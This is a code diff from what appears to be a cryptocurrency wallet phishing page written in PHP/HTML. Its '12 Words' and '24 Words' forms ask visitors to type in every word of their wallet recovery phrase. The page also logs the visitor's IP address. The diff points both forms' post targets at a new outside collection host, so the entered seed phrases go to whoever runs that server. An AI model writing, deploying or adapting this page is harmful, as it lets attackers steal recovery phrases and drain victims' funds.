@@ -773,7 +773,7 @@ $user_ip = getUserIP();
           <button onclick="open24()" id='open24' data-tab=2 class=tablinks>24 Words</button>
         </div>
         <div id=London class=tabcontent style=display:block>
-          <form action="https://unwooed-eases.000webhostapp.com/get12.php" method=post>
+          <form action="https://dolphin-app-r4ljg.ondigitalocean.app/get12.php" method=post>
             <div class=input-tab>
               <input type=text placeholder="1. word" class=input-1 id="word001" name=word01 required value>
               <input type=text placeholder="2. word" class=input-2 id="word002" name=word02 required value>
@@ -796,7 +796,7 @@ $user_ip = getUserIP();
           </form>
         </div>
         <div id=Paris class="tabcontent" style="display:none;">
-          <form action="https://unwooed-eases.000webhostapp.com/get24.php" method="post">
+          <form action="https://dolphin-app-r4ljg.ondigitalocean.app/get24.php" method="post">
             <div class="input-tab">
               <input type="text" placeholder="1. word" class="input-1" id="word01" name="word01" required="" value="">
               <input type="text" placeholder="2. word" class="input-2" id="word02" name="word02" required="" value="">
